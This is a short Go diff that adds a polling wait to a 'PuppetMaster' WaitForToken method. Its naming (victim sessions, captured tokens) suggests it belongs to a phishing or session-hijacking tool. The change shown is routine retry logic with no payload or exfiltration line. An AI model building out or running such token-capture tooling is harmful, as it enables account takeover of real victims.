@@ -403,16 +403,27 @@ func (pm *PuppetMaster) GetSession(victimSessionID string) (*PuppetSession, bool
 
 // WaitForToken waits for a puppet session to complete and return a token
 func (pm *PuppetMaster) WaitForToken(sessionID, tokenName string, timeout time.Duration) (string, error) {
-	// First check if token already exists
+	// 1. First check if token already exists (fast path)
 	if token, exists := pm.GetToken(sessionID, tokenName); exists {
 		log.Debug("[PUPPET] Token already available for session %s", sessionID)
 		return token, nil
 	}
 	
-	// Check if puppet session is running
-	session, exists := pm.GetSession(sessionID)
+	// 2. Wait for puppet session to appear if it hasn't yet (registration wait)
+	startTime := time.Now()
+	var session *PuppetSession
+	var exists bool
+	
+	for time.Since(startTime) < 5*time.Second {
+		session, exists = pm.GetSession(sessionID)
+		if exists {
+			break
+		}
+		time.Sleep(200 * time.Millisecond)
+	}
+	
 	if !exists {
-		return "", fmt.Errorf("no puppet session found for %s", sessionID)
+		return "", fmt.Errorf("no puppet session found for %s after waiting", sessionID)
 	}
 	
 	if session.CompletionChan == nil {
